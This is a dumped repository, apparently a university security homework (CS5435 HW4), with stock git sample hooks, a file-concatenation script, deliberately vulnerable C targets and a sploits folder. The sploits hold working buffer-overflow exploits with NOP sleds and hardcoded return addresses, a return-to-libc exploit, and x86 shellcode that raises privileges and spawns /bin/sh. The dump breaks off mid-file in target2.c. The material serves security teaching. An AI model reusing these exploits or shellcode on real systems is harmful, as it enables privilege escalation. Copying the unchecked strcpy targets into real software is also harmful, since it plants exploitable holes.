f8d27309725087299c0ae9fb6636d57984bed39c cb508fcc3161dd36de158d7f2fdc6934da4be6c5 justinhalford <justinhalford@gmail.com> 1713753703 -0400	update by push
cb508fcc3161dd36de158d7f2fdc6934da4be6c5 dfee827ec55600fc073f826ec2c0ed764ed192ed justinhalford <justinhalford@gmail.com> 1714700350 -0400	update by push
dfee827ec55600fc073f826ec2c0ed764ed192ed 8fe91943ed6def84c8a4a581ef70c7a8a2eac9a3 justinhalford <justinhalford@gmail.com> 1714701281 -0400	update by push

<END OF ./.git/logs/refs/remotes/origin/main>
<START OF ./.git/hooks/commit-msg.sample>
#!/bin/sh
#
# An example hook script to check the commit log message.
# Called by "git commit" with one argument, the name of the file
# that has the commit message.  The hook should exit with non-zero
# status after issuing an appropriate message if it wants to stop the
# commit.  The hook is allowed to edit the commit message file.
#
# To enable this hook, rename this file to "commit-msg".

# Uncomment the below to add a Signed-off-by line to the message.
# Doing this in a hook is a bad idea in general, but the prepare-commit-msg
# hook is more suited to it.
#
# SOB=$(git var GIT_AUTHOR_IDENT | sed -n 's/^\(.*>\).*$/Signed-off-by: \1/p')
# grep -qs "^$SOB" "$1" || echo "$SOB" >> "$1"

# This example catches duplicate Signed-off-by lines.

test "" = "$(grep '^Signed-off-by: ' "$1" |
	 sort | uniq -c | sed -e '/^[ 	]*1[ 	]/d')" || {
	echo >&2 Duplicate Signed-off-by lines.
	exit 1
}

<END OF ./.git/hooks/commit-msg.sample>
<START OF ./.git/hooks/pre-rebase.sample>
#!/bin/sh
#
# Copyright (c) 2006, 2008 Junio C Hamano
#
# The "pre-rebase" hook is run just before "git rebase" starts doing
# its job, and can prevent the command from running by exiting with
# non-zero status.
#
# The hook is called with the following parameters:
#
# $1 -- the upstream the series was forked from.
# $2 -- the branch being rebased (or empty when rebasing the current branch).
#
# This sample shows how to prevent topic branches that are already
# merged to 'next' branch from getting rebased, because allowing it
# would result in rebasing already published history.

publish=next
basebranch="$1"
if test "$#" = 2
then
	topic="refs/heads/$2"
else
	topic=`git symbolic-ref HEAD` ||
	exit 0 ;# we do not interrupt rebasing detached HEAD
fi

case "$topic" in
refs/heads/??/*)
	;;
*)
	exit 0 ;# we do not interrupt others.
	;;
esac

# Now we are dealing with a topic branch being rebased
# on top of master.  Is it OK to rebase it?

# Does the topic really exist?
git show-ref -q "$topic" || {
	echo >&2 "No such branch $topic"
	exit 1
}

# Is topic fully merged to master?
not_in_master=`git rev-list --pretty=oneline ^master "$topic"`
if test -z "$not_in_master"
then
	echo >&2 "$topic is fully merged to master; better remove it."
	exit 1 ;# we could allow it, but there is no point.
fi

# Is topic ever merged to next?  If so you should not be rebasing it.
only_next_1=`git rev-list ^master "^$topic" ${publish} | sort`
only_next_2=`git rev-list ^master           ${publish} | sort`
if test "$only_next_1" = "$only_next_2"
then
	not_in_topic=`git rev-list "^$topic" master`
	if test -z "$not_in_topic"
	then
		echo >&2 "$topic is already up to date with master"
		exit 1 ;# we could allow it, but there is no point.
	else
		exit 0
	fi
else
	not_in_next=`git rev-list --pretty=oneline ^${publish} "$topic"`
	/usr/bin/perl -e '
		my $topic = $ARGV[0];
		my $msg = "* $topic has commits already merged to public branch:\n";
		my (%not_in_next) = map {
			/^([0-9a-f]+) /;
			($1 => 1);
		} split(/\n/, $ARGV[1]);
		for my $elem (map {
				/^([0-9a-f]+) (.*)$/;
				[$1 => $2];
			} split(/\n/, $ARGV[2])) {
			if (!exists $not_in_next{$elem->[0]}) {
				if ($msg) {
					print STDERR $msg;
					undef $msg;
				}
				print STDERR " $elem->[1]\n";
			}
		}
	' "$topic" "$not_in_next" "$not_in_master"
	exit 1
fi

<<\DOC_END

This sample hook safeguards topic branches that have been
published from being rewound.

The workflow assumed here is:

 * Once a topic branch forks from "master", "master" is never
   merged into it again (either directly or indirectly).

 * Once a topic branch is fully cooked and merged into "master",
   it is deleted.  If you need to build on top of it to correct
   earlier mistakes, a new topic branch is created by forking at
   the tip of the "master".  This is not strictly necessary, but
   it makes it easier to keep your history simple.

 * Whenever you need to test or publish your changes to topic
   branches, merge them into "next" branch.

The script, being an example, hardcodes the publish branch name
to be "next", but it is trivial to make it configurable via
$GIT_DIR/config mechanism.

With this workflow, you would want to know:

(1) ... if a topic branch has ever been merged to "next".  Young
    topic branches can have stupid mistakes you would rather
    clean up before publishing, and things that have not been
    merged into other branches can be easily rebased without
    affecting other people.  But once it is published, you would
    not want to rewind it.

(2) ... if a topic branch has been fully merged to "master".
    Then you can delete it.  More importantly, you should not
    build on top of it -- other people may already want to
    change things related to the topic as patches against your
    "master", so if you need further changes, it is better to
    fork the topic (perhaps with the same name) afresh from the
    tip of "master".

Let's look at this example:

		   o---o---o---o---o---o---o---o---o---o "next"
		  /       /           /           /
		 /   a---a---b A     /           /
		/   /               /           /
	       /   /   c---c---c---c B         /
	      /   /   /             \         /
	     /   /   /   b---b C     \       /
	    /   /   /   /             \     /
    ---o---o---o---o---o---o---o---o---o---o---o "master"


A, B and C are topic branches.

 * A has one fix since it was merged up to "next".

 * B has finished.  It has been fully merged up to "master" and "next",
   and is ready to be deleted.

 * C has not merged to "next" at all.

We would want to allow C to be rebased, refuse A, and encourage
B to be deleted.

To compute (1):

	git rev-list ^master ^topic next
	git rev-list ^master        next

	if these match, topic has not merged in next at all.

To compute (2):

	git rev-list master..topic

	if this is empty, it is fully merged to "master".

DOC_END

<END OF ./.git/hooks/pre-rebase.sample>
<START OF ./.git/hooks/pre-commit.sample>
#!/bin/sh
#
# An example hook script to verify what is about to be committed.
# Called by "git commit" with no arguments.  The hook should
# exit with non-zero status after issuing an appropriate message if
# it wants to stop the commit.
#
# To enable this hook, rename this file to "pre-commit".

if git rev-parse --verify HEAD >/dev/null 2>&1
then
	against=HEAD
else
	# Initial commit: diff against an empty tree object
	against=$(git hash-object -t tree /dev/null)
fi

# If you want to allow non-ASCII filenames set this variable to true.
allownonascii=$(git config --type=bool hooks.allownonascii)

# Redirect output to stderr.
exec 1>&2

# Cross platform projects tend to avoid non-ASCII filenames; prevent
# them from being added to the repository. We exploit the fact that the
# printable range starts at the space character and ends with tilde.
if [ "$allownonascii" != "true" ] &&
	# Note that the use of brackets around a tr range is ok here, (it's
	# even required, for portability to Solaris 10's /usr/bin/tr), since
	# the square bracket bytes happen to fall in the designated range.
	test $(git diff --cached --name-only --diff-filter=A -z $against |
	  LC_ALL=C tr -d '[ -~]\0' | wc -c) != 0
then
	cat <<\EOF
Error: Attempt to add a non-ASCII file name.

This can cause problems if you want to work with people on other platforms.

To be portable it is advisable to rename the file.

If you know what you are doing you can disable this check using:

  git config hooks.allownonascii true
EOF
	exit 1
fi

# If there are whitespace errors, print the offending file names and fail.
exec git diff-index --check --cached $against --

<END OF ./.git/hooks/pre-commit.sample>
<START OF ./.git/hooks/applypatch-msg.sample>
#!/bin/sh
#
# An example hook script to check the commit log message taken by
# applypatch from an e-mail message.
#
# The hook should exit with non-zero status after issuing an
# appropriate message if it wants to stop the commit.  The hook is
# allowed to edit the commit message file.
#
# To enable this hook, rename this file to "applypatch-msg".

. git-sh-setup
commitmsg="$(git rev-parse --git-path hooks/commit-msg)"
test -x "$commitmsg" && exec "$commitmsg" ${1+"$@"}
:

<END OF ./.git/hooks/applypatch-msg.sample>
<START OF ./.git/hooks/fsmonitor-watchman.sample>
#!/usr/bin/perl

use strict;
use warnings;
use IPC::Open2;

# An example hook script to integrate Watchman
# (https://facebook.github.io/watchman/) with git to speed up detecting
# new and modified files.
#
# The hook is passed a version (currently 2) and last update token
# formatted as a string and outputs to stdout a new update token and
# all files that have been modified since the update token. Paths must
# be relative to the root of the working tree and separated by a single NUL.
#
# To enable this hook, rename this file to "query-watchman" and set
# 'git config core.fsmonitor .git/hooks/query-watchman'
#
my ($version, $last_update_token) = @ARGV;

# Uncomment for debugging
# print STDERR "$0 $version $last_update_token\n";

# Check the hook interface version
if ($version ne 2) {
	die "Unsupported query-fsmonitor hook version '$version'.\n" .
	    "Falling back to scanning...\n";
}

my $git_work_tree = get_working_dir();

my $retry = 1;

my $json_pkg;
eval {
	require JSON::XS;
	$json_pkg = "JSON::XS";
	1;
} or do {
	require JSON::PP;
	$json_pkg = "JSON::PP";
};

launch_watchman();

sub launch_watchman {
	my $o = watchman_query();
	if (is_work_tree_watched($o)) {
		output_result($o->{clock}, @{$o->{files}});
	}
}

sub output_result {
	my ($clockid, @files) = @_;

	# Uncomment for debugging watchman output
	# open (my $fh, ">", ".git/watchman-output.out");
	# binmode $fh, ":utf8";
	# print $fh "$clockid\n@files\n";
	# close $fh;

	binmode STDOUT, ":utf8";
	print $clockid;
	print "\0";
	local $, = "\0";
	print @files;
}

sub watchman_clock {
	my $response = qx/watchman clock "$git_work_tree"/;
	die "Failed to get clock id on '$git_work_tree'.\n" .
		"Falling back to scanning...\n" if $? != 0;

	return $json_pkg->new->utf8->decode($response);
}

sub watchman_query {
	my $pid = open2(\*CHLD_OUT, \*CHLD_IN, 'watchman -j --no-pretty')
	or die "open2() failed: $!\n" .
	"Falling back to scanning...\n";

	# In the query expression below we're asking for names of files that
	# changed since $last_update_token but not from the .git folder.
	#
	# To accomplish this, we're using the "since" generator to use the
	# recency index to select candidate nodes and "fields" to limit the
	# output to file names only. Then we're using the "expression" term to
	# further constrain the results.
	if (substr($last_update_token, 0, 1) eq "c") {
		$last_update_token = "\"$last_update_token\"";
	}
	my $query = <<"	END";
		["query", "$git_work_tree", {
			"since": $last_update_token,
			"fields": ["name"],
			"expression": ["not", ["dirname", ".git"]]
		}]
	END

	# Uncomment for debugging the watchman query
	# open (my $fh, ">", ".git/watchman-query.json");
	# print $fh $query;
	# close $fh;

	print CHLD_IN $query;
	close CHLD_IN;
	my $response = do {local $/; <CHLD_OUT>};

	# Uncomment for debugging the watch response
	# open ($fh, ">", ".git/watchman-response.json");
	# print $fh $response;
	# close $fh;

	die "Watchman: command returned no output.\n" .
	"Falling back to scanning...\n" if $response eq "";
	die "Watchman: command returned invalid output: $response\n" .
	"Falling back to scanning...\n" unless $response =~ /^\{/;

	return $json_pkg->new->utf8->decode($response);
}

sub is_work_tree_watched {
	my ($output) = @_;
	my $error = $output->{error};
	if ($retry > 0 and $error and $error =~ m/unable to resolve root .* directory (.*) is not watched/) {
		$retry--;
		my $response = qx/watchman watch "$git_work_tree"/;
		die "Failed to make watchman watch '$git_work_tree'.\n" .
		    "Falling back to scanning...\n" if $? != 0;
		$output = $json_pkg->new->utf8->decode($response);
		$error = $output->{error};
		die "Watchman: $error.\n" .
		"Falling back to scanning...\n" if $error;

		# Uncomment for debugging watchman output
		# open (my $fh, ">", ".git/watchman-output.out");
		# close $fh;

		# Watchman will always return all files on the first query so
		# return the fast "everything is dirty" flag to git and do the
		# Watchman query just to get it over with now so we won't pay
		# the cost in git to look up each individual file.
		my $o = watchman_clock();
		$error = $output->{error};

		die "Watchman: $error.\n" .
		"Falling back to scanning...\n" if $error;

		output_result($o->{clock}, ("/"));
		$last_update_token = $o->{clock};

		eval { launch_watchman() };
		return 0;
	}

	die "Watchman: $error.\n" .
	"Falling back to scanning...\n" if $error;

	return 1;
}

sub get_working_dir {
	my $working_dir;
	if ($^O =~ 'msys' || $^O =~ 'cygwin') {
		$working_dir = Win32::GetCwd();
		$working_dir =~ tr/\\/\//;
	} else {
		require Cwd;
		$working_dir = Cwd::cwd();
	}

	return $working_dir;
}

<END OF ./.git/hooks/fsmonitor-watchman.sample>
<START OF ./.git/hooks/pre-receive.sample>
#!/bin/sh
#
# An example hook script to make use of push options.
# The example simply echoes all push options that start with 'echoback='
# and rejects all pushes when the "reject" push option is used.
#
# To enable this hook, rename this file to "pre-receive".

if test -n "$GIT_PUSH_OPTION_COUNT"
then
	i=0
	while test "$i" -lt "$GIT_PUSH_OPTION_COUNT"
	do
		eval "value=\$GIT_PUSH_OPTION_$i"
		case "$value" in
		echoback=*)
			echo "echo from the pre-receive-hook: ${value#*=}" >&2
			;;
		reject)
			exit 1
		esac
		i=$((i + 1))
	done
fi

<END OF ./.git/hooks/pre-receive.sample>
<START OF ./.git/hooks/prepare-commit-msg.sample>
#!/bin/sh
#
# An example hook script to prepare the commit log message.
# Called by "git commit" with the name of the file that has the
# commit message, followed by the description of the commit
# message's source.  The hook's purpose is to edit the commit
# message file.  If the hook fails with a non-zero status,
# the commit is aborted.
#
# To enable this hook, rename this file to "prepare-commit-msg".

# This hook includes three examples. The first one removes the
# "# Please enter the commit message..." help message.
#
# The second includes the output of "git diff --name-status -r"
# into the message, just before the "git status" output.  It is
# commented because it doesn't cope with --amend or with squashed
# commits.
#
# The third example adds a Signed-off-by line to the message, that can
# still be edited.  This is rarely a good idea.

COMMIT_MSG_FILE=$1
COMMIT_SOURCE=$2
SHA1=$3

/usr/bin/perl -i.bak -ne 'print unless(m/^. Please enter the commit message/..m/^#$/)' "$COMMIT_MSG_FILE"

# case "$COMMIT_SOURCE,$SHA1" in
#  ,|template,)
#    /usr/bin/perl -i.bak -pe '
#       print "\n" . `git diff --cached --name-status -r`
# 	 if /^#/ && $first++ == 0' "$COMMIT_MSG_FILE" ;;
#  *) ;;
# esac

# SOB=$(git var GIT_COMMITTER_IDENT | sed -n 's/^\(.*>\).*$/Signed-off-by: \1/p')
# git interpret-trailers --in-place --trailer "$SOB" "$COMMIT_MSG_FILE"
# if test -z "$COMMIT_SOURCE"
# then
#   /usr/bin/perl -i.bak -pe 'print "\n" if !$first_line++' "$COMMIT_MSG_FILE"
# fi

<END OF ./.git/hooks/prepare-commit-msg.sample>
<START OF ./.git/hooks/post-update.sample>
#!/bin/sh
#
# An example hook script to prepare a packed repository for use over
# dumb transports.
#
# To enable this hook, rename this file to "post-update".

exec git update-server-info

<END OF ./.git/hooks/post-update.sample>
<START OF ./.git/hooks/pre-merge-commit.sample>
#!/bin/sh
#
# An example hook script to verify what is about to be committed.
# Called by "git merge" with no arguments.  The hook should
# exit with non-zero status after issuing an appropriate message to
# stderr if it wants to stop the merge commit.
#
# To enable this hook, rename this file to "pre-merge-commit".

. git-sh-setup
test -x "$GIT_DIR/hooks/pre-commit" &&
        exec "$GIT_DIR/hooks/pre-commit"
:

<END OF ./.git/hooks/pre-merge-commit.sample>
<START OF ./.git/hooks/pre-applypatch.sample>
#!/bin/sh
#
# An example hook script to verify what is about to be committed
# by applypatch from an e-mail message.
#
# The hook should exit with non-zero status after issuing an
# appropriate message if it wants to stop the commit.
#
# To enable this hook, rename this file to "pre-applypatch".

. git-sh-setup
precommit="$(git rev-parse --git-path hooks/pre-commit)"
test -x "$precommit" && exec "$precommit" ${1+"$@"}
:

<END OF ./.git/hooks/pre-applypatch.sample>
<START OF ./.git/hooks/pre-push.sample>
#!/bin/sh

# An example hook script to verify what is about to be pushed.  Called by "git
# push" after it has checked the remote status, but before anything has been
# pushed.  If this script exits with a non-zero status nothing will be pushed.
#
# This hook is called with the following parameters:
#
# $1 -- Name of the remote to which the push is being done
# $2 -- URL to which the push is being done
#
# If pushing without using a named remote those arguments will be equal.
#
# Information about the commits which are being pushed is supplied as lines to
# the standard input in the form:
#
#   <local ref> <local sha1> <remote ref> <remote sha1>
#
# This sample shows how to prevent push of commits where the log message starts
# with "WIP" (work in progress).

remote="$1"
url="$2"

z40=0000000000000000000000000000000000000000

while read local_ref local_sha remote_ref remote_sha
do
	if [ "$local_sha" = $z40 ]
	then
		# Handle delete
		:
	else
		if [ "$remote_sha" = $z40 ]
		then
			# New branch, examine all commits
			range="$local_sha"
		else
			# Update to existing branch, examine new commits
			range="$remote_sha..$local_sha"
		fi

		# Check for WIP commit
		commit=`git rev-list -n 1 --grep '^WIP' "$range"`
		if [ -n "$commit" ]
		then
			echo >&2 "Found WIP commit in $local_ref, not pushing"
			exit 1
		fi
	fi
done

exit 0

<END OF ./.git/hooks/pre-push.sample>
<START OF ./.git/hooks/update.sample>
#!/bin/sh
#
# An example hook script to block unannotated tags from entering.
# Called by "git receive-pack" with arguments: refname sha1-old sha1-new
#
# To enable this hook, rename this file to "update".
#
# Config
# ------
# hooks.allowunannotated
#   This boolean sets whether unannotated tags will be allowed into the
#   repository.  By default they won't be.
# hooks.allowdeletetag
#   This boolean sets whether deleting tags will be allowed in the
#   repository.  By default they won't be.
# hooks.allowmodifytag
#   This boolean sets whether a tag may be modified after creation. By default
#   it won't be.
# hooks.allowdeletebranch
#   This boolean sets whether deleting branches will be allowed in the
#   repository.  By default they won't be.
# hooks.denycreatebranch
#   This boolean sets whether remotely creating branches will be denied
#   in the repository.  By default this is allowed.
#

# --- Command line
refname="$1"
oldrev="$2"
newrev="$3"

# --- Safety check
if [ -z "$GIT_DIR" ]; then
	echo "Don't run this script from the command line." >&2
	echo " (if you want, you could supply GIT_DIR then run" >&2
	echo "  $0 <ref> <oldrev> <newrev>)" >&2
	exit 1
fi

if [ -z "$refname" -o -z "$oldrev" -o -z "$newrev" ]; then
	echo "usage: $0 <ref> <oldrev> <newrev>" >&2
	exit 1
fi

# --- Config
allowunannotated=$(git config --type=bool hooks.allowunannotated)
allowdeletebranch=$(git config --type=bool hooks.allowdeletebranch)
denycreatebranch=$(git config --type=bool hooks.denycreatebranch)
allowdeletetag=$(git config --type=bool hooks.allowdeletetag)
allowmodifytag=$(git config --type=bool hooks.allowmodifytag)

# check for no description
projectdesc=$(sed -e '1q' "$GIT_DIR/description")
case "$projectdesc" in
"Unnamed repository"* | "")
	echo "*** Project description file hasn't been set" >&2
	exit 1
	;;
esac

# --- Check types
# if $newrev is 0000...0000, it's a commit to delete a ref.
zero="0000000000000000000000000000000000000000"
if [ "$newrev" = "$zero" ]; then
	newrev_type=delete
else
	newrev_type=$(git cat-file -t $newrev)
fi

case "$refname","$newrev_type" in
	refs/tags/*,commit)
		# un-annotated tag
		short_refname=${refname##refs/tags/}
		if [ "$allowunannotated" != "true" ]; then
			echo "*** The un-annotated tag, $short_refname, is not allowed in this repository" >&2
			echo "*** Use 'git tag [ -a | -s ]' for tags you want to propagate." >&2
			exit 1
		fi
		;;
	refs/tags/*,delete)
		# delete tag
		if [ "$allowdeletetag" != "true" ]; then
			echo "*** Deleting a tag is not allowed in this repository" >&2
			exit 1
		fi
		;;
	refs/tags/*,tag)
		# annotated tag
		if [ "$allowmodifytag" != "true" ] && git rev-parse $refname > /dev/null 2>&1
		then
			echo "*** Tag '$refname' already exists." >&2
			echo "*** Modifying a tag is not allowed in this repository." >&2
			exit 1
		fi
		;;
	refs/heads/*,commit)
		# branch
		if [ "$oldrev" = "$zero" -a "$denycreatebranch" = "true" ]; then
			echo "*** Creating a branch is not allowed in this repository" >&2
			exit 1
		fi
		;;
	refs/heads/*,delete)
		# delete branch
		if [ "$allowdeletebranch" != "true" ]; then
			echo "*** Deleting a branch is not allowed in this repository" >&2
			exit 1
		fi
		;;
	refs/remotes/*,commit)
		# tracking branch
		;;
	refs/remotes/*,delete)
		# delete tracking branch
		if [ "$allowdeletebranch" != "true" ]; then
			echo "*** Deleting a tracking branch is not allowed in this repository" >&2
			exit 1
		fi
		;;
	*)
		# Anything else (is there anything else?)
		echo "*** Update hook: unknown type of update to ref $refname of type $newrev_type" >&2
		exit 1
		;;
esac

# --- Finished
exit 0

<END OF ./.git/hooks/update.sample>
<START OF ./.git/refs/heads/master>
4861122ff0358bef3a46545443aa5146e2400256

<END OF ./.git/refs/heads/master>
<START OF ./.git/refs/heads/main>
8fe91943ed6def84c8a4a581ef70c7a8a2eac9a3

<END OF ./.git/refs/heads/main>
<START OF ./.git/refs/remotes/origin/master>
4861122ff0358bef3a46545443aa5146e2400256

<END OF ./.git/refs/remotes/origin/master>
<START OF ./.git/refs/remotes/origin/main>
8fe91943ed6def84c8a4a581ef70c7a8a2eac9a3

<END OF ./.git/refs/remotes/origin/main>
<START OF ./repo.txt>
<START OF ./getCode.py>
import os

def append_file_contents_to_repo(start_dir, repo_file_path):
    """
    Recursively append the contents of all files in start_dir and its subdirectories
    to a single file specified by repo_file_path.
    """
    for root, dirs, files in os.walk(start_dir):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    contents = f.read()
                with open(repo_file_path, 'a', encoding='utf-8') as repo:
                    repo.write(f"<START OF {file_path}>\n")
                    repo.write(contents)
                    repo.write(f"\n<END OF {file_path}>\n")
            except Exception as e:
                print(f"Failed to process {file_path}: {e}")

if __name__ == "__main__":
    repo_file = "repo.txt"
    start_directory = "."  # Current directory
    append_file_contents_to_repo(start_directory, repo_file)

<END OF ./getCode.py>
<START OF ./cs5435-hw4/README.txt>
CS5435 HW4

Included are two directories:

demo/
This contains the demo target meet.c. 

sploits/
This contains the starter code for your exploits. 

targets/
This contains the targets. You can build the targets by running "sudo make" in targets/. 
The resulting executables will be placed in /tmp/ with appropriate
permissions.



<END OF ./cs5435-hw4/README.txt>
<START OF ./cs5435-hw4/demo/get_sp.c>
#include <stdio.h>

unsigned long get_sp(void) 
{
	__asm__("movl %esp, %eax");
}

int main() 
{
	printf("Stack pointer (ESP): 0x%x\n", get_sp() );
}


<END OF ./cs5435-hw4/demo/get_sp.c>
<START OF ./cs5435-hw4/demo/meet.c>
#include <stdio.h>
#include <string.h>


void greeting( char* temp1 )
{
	char name[400];
	memset(name, 0, 400);
	strcpy(name, temp1);
	printf( "Hi %s \n", name );
}


int main(int argc, char* argv[] ) 
{
	greeting( argv[1] );
	printf( "Bye %s\n", argv[1] );
}

<END OF ./cs5435-hw4/demo/meet.c>
<START OF ./cs5435-hw4/demo/simpleargs.c>
#include <stdio.h>
#include <string.h>


greeting( int v1 )
{
	char name[400];
}


int main(int argc, char* argv[] ) 
{
	int p1;
	greeting( p1 );
}

<END OF ./cs5435-hw4/demo/simpleargs.c>
<START OF ./cs5435-hw4/sploits/sploit1.c>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

int main(void)
{
  char *args[3];
  char *env[2];  

  char buf[32];
  memset(buf, 0x90, 32);
  strncpy(buf+10, shellcode, 22);
  
  uint32_t ret = 0xffffcfdc;

  env[0] = buf;  
  env[1] = NULL;

  args[0] = TARGET;
  args[1] = (char*)&ret;
  args[2] = NULL;
  
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
<END OF ./cs5435-hw4/sploits/sploit1.c>
<START OF ./cs5435-hw4/sploits/sploitEC.c>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"
#define LIBC_BASE 0xf7de1000

int main(void)
{
  char *args[3];
  char *env[1];

  char buf[32];
  uint32_t *addr_ptr = (uint32_t *)(buf);

  *addr_ptr++ = LIBC_BASE + 0x000b8c30;
  *addr_ptr++ = 0;
  *addr_ptr++ = LIBC_BASE + 0x0002f7d0;
  *addr_ptr++ = 0;
  *addr_ptr++ = LIBC_BASE + 0x0015f294;
  
  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;

  env[0] = NULL;

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
<END OF ./cs5435-hw4/sploits/sploitEC.c>
<START OF ./cs5435-hw4/sploits/sploit2.c>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{
  char *args[3];
  char *env[1]; 

  char buf[500];
  memset(buf, 0x90, 500);
  memcpy(buf+400, shellcode, sizeof(shellcode));

  uint32_t *addr_ptr = (uint32_t*)(buf + 488);
  *addr_ptr++ = 0xffffcf48;
  *addr_ptr++ = 0xffffcf48;
  *addr_ptr++ = 0xffffcf48;

  args[0] = TARGET;
  args[1] = buf;
  args[2] = "400";
  
  env[0] = NULL;

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
<END OF ./cs5435-hw4/sploits/sploit2.c>
<START OF ./cs5435-hw4/sploits/sploit3.c>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
  char *args[3];
  char *env[1];

  char buf[256];
  int32_t *intvec = (int32_t*)buf;

  memset(buf, 0x90, 256);
  memcpy(buf+32, shellcode, sizeof(shellcode)); 

  intvec[16] = 0xffffcf88;
  intvec[17] = 0xffffcf88;
  intvec[18] = 0xffffcf88;
  intvec[19] = 0xffffcf88;
  intvec[20] = 0xffffcf88;

  args[0] = TARGET;
  args[1] = buf; 
  args[2] = NULL;

  env[0] = NULL;

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
<END OF ./cs5435-hw4/sploits/sploit3.c>
<START OF ./cs5435-hw4/sploits/shellcode.h>
static char shellcode[] = 
  "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\xa4\xb3\x1f\xb1\x1f\xb2\x1f"
  "\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c"
  "\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8"
  "\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";

<END OF ./cs5435-hw4/sploits/shellcode.h>
<START OF ./cs5435-hw4/sploits/sploit0.c>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target0"

int main(void)
{
  char *args[3];
  char *env[1];

  char buf[424];
  memset(buf, 0x90, 424);
  memcpy(buf+200, shellcode, sizeof(shellcode));

  uint32_t *addr_ptr = (uint32_t*)(buf + 412);
  *addr_ptr++ = 0xffffcf5c;
  *addr_ptr++ = 0xffffcf5c;  
  *addr_ptr++ = 0xffffcf5c;

  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;

  env[0] = NULL;

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
<END OF ./cs5435-hw4/sploits/sploit0.c>
<START OF ./cs5435-hw4/sploits/sploit4.c>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
  char *args[3];
  char *env[1];

  char buf[24];

  uint32_t *addr_ptr = (uint32_t *)(buf);
  
  *addr_ptr++ = 0xffffe420;
  *addr_ptr++ = 0xffffcff0;
  *addr_ptr++ = 0xffffcfe8;

  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;

  env[0] = NULL;

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
<END OF ./cs5435-hw4/sploits/sploit4.c>
<START OF ./cs5435-hw4/sploits/sploit1.dSYM/Contents/Info.plist>
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
	<dict>
		<key>CFBundleDevelopmentRegion</key>
		<string>English</string>
		<key>CFBundleIdentifier</key>
		<string>com.apple.xcode.dsym.sploit1</string>
		<key>CFBundleInfoDictionaryVersion</key>
		<string>6.0</string>
		<key>CFBundlePackageType</key>
		<string>dSYM</string>
		<key>CFBundleSignature</key>
		<string>????</string>
		<key>CFBundleShortVersionString</key>
		<string>1.0</string>
		<key>CFBundleVersion</key>
		<string>1</string>
	</dict>
</plist>

<END OF ./cs5435-hw4/sploits/sploit1.dSYM/Contents/Info.plist>
<START OF ./cs5435-hw4/sploits/sploit0.dSYM/Contents/Info.plist>
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
	<dict>
		<key>CFBundleDevelopmentRegion</key>
		<string>English</string>
		<key>CFBundleIdentifier</key>
		<string>com.apple.xcode.dsym.sploit0</string>
		<key>CFBundleInfoDictionaryVersion</key>
		<string>6.0</string>
		<key>CFBundlePackageType</key>
		<string>dSYM</string>
		<key>CFBundleSignature</key>
		<string>????</string>
		<key>CFBundleShortVersionString</key>
		<string>1.0</string>
		<key>CFBundleVersion</key>
		<string>1</string>
	</dict>
</plist>

<END OF ./cs5435-hw4/sploits/sploit0.dSYM/Contents/Info.plist>
<START OF ./cs5435-hw4/sploits/sploit2.dSYM/Contents/Info.plist>
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
	<dict>
		<key>CFBundleDevelopmentRegion</key>
		<string>English</string>
		<key>CFBundleIdentifier</key>
		<string>com.apple.xcode.dsym.sploit2</string>
		<key>CFBundleInfoDictionaryVersion</key>
		<string>6.0</string>
		<key>CFBundlePackageType</key>
		<string>dSYM</string>
		<key>CFBundleSignature</key>
		<string>????</string>
		<key>CFBundleShortVersionString</key>
		<string>1.0</string>
		<key>CFBundleVersion</key>
		<string>1</string>
	</dict>
</plist>

<END OF ./cs5435-hw4/sploits/sploit2.dSYM/Contents/Info.plist>
<START OF ./cs5435-hw4/targets/target2.c>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void greeting( char* temp1, short input_size )
{
  char name[400];

  if( input_size != 399 ) 
  {
    fprintf(stderr, "Error: input_size not 399\n" );
    return;
  }
  strcpy(name, temp1);
  printf( "Hi %s\n", name );
}


int main(int argc, char* argv[] ) 
{
  int real_size = 0;
  int input_size = 0;

  if(argc != 3 )
  {
    fprintf(stderr, "meet: argc != 3\n");
    exit(EXIT_FAILURE);
  }

  real_size = strlen(argv[1]);
